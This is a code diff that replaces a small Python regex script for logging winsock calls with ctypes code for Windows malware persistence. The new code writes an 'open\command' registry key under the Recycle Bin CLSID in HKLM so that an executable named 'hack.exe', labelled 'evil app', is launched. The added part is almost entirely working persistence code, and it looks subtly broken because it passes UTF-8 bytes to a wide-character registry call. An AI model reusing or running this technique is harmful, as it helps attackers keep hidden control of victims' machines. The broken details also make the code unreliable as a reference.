@@ -1,21 +1,45 @@
-import re
+import ctypes
 
-# port scan
-# Use regular expression to match the function names, parameters, and result
-calls = "s.value = winsock.socket(2, 1, 6)\nresult = winsock.connect(s, address, ctypes.sizeof(address), port)\nwinsock.closesocket(s)\nwinsock.getaddrinfo(target, None, None, ctypes.byref(address))"
-pattern = re.compile(r"(\w+)\s*=\s*winsock\.(\w+)\((.*)\)|winsock\.(\w+)\((.*)\)")
+# shell
+shell = "SOFTWARE\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell"
 
-functions_dict = {}
+# evil app
+exe = "C:\\Users\\IEUser\\Desktop\\research\\2023-01-20-malware-pers-21\\hack.exe".encode('utf-8')
 
-with open("log.txt", "a") as file:
-    for match in pattern.finditer(calls):
-        variable_name = match.group(1) if match.group(1) else None
-        function_name = match.group(2) if match.group(2) else match.group(4)
-        parameters = match.group(3) if match.group(3) else match.group(5)
-        functions_dict[function_name] = [param.strip() for param in parameters.split(",") if param.strip()]
+# open registry key
+hkey = ctypes.c_void_p()
+res = ctypes.windll.advapi32.RegOpenKeyExW(
+    ctypes.c_uint32(0x80000002), # HKEY_LOCAL_MACHINE
+    shell,
+    0,
+    0x00020019, # KEY_WRITE
+    ctypes.byref(hkey)
+)
 
-        file.write(f"Variable name: {variable_name}\n") if variable_name else None
-        file.write(f"Library name: winsock\n")
-        file.write(f"Function name: {function_name}\n")
-        file.write(f"Parameters: {parameters}\n")
-        file.write("\n")
+if res == 0:
+    # create sub-key
+    hkR = ctypes.c_void_p()
+    res = ctypes.windll.advapi32.RegCreateKeyExW(
+        hkey,
+        "open\\command",
+        0,
+        None,
+        0, # REG_OPTION_NON_VOLATILE
+        0x000f003f, # KEY_ALL_ACCESS
+        None,
+        ctypes.byref(hkR),
+        None
+    )
+
+    if res == 0:
+        # set registry key value
+        res = ctypes.windll.advapi32.RegSetValueExW(
+            hkR,
+            None,
+            0,
+            1, # REG_SZ
+            exe,
+            len(exe)
+        )
+        ctypes.windll.advapi32.RegCloseKey(hkR)
+    ctypes.windll.advapi32.RegCloseKey(hkey)
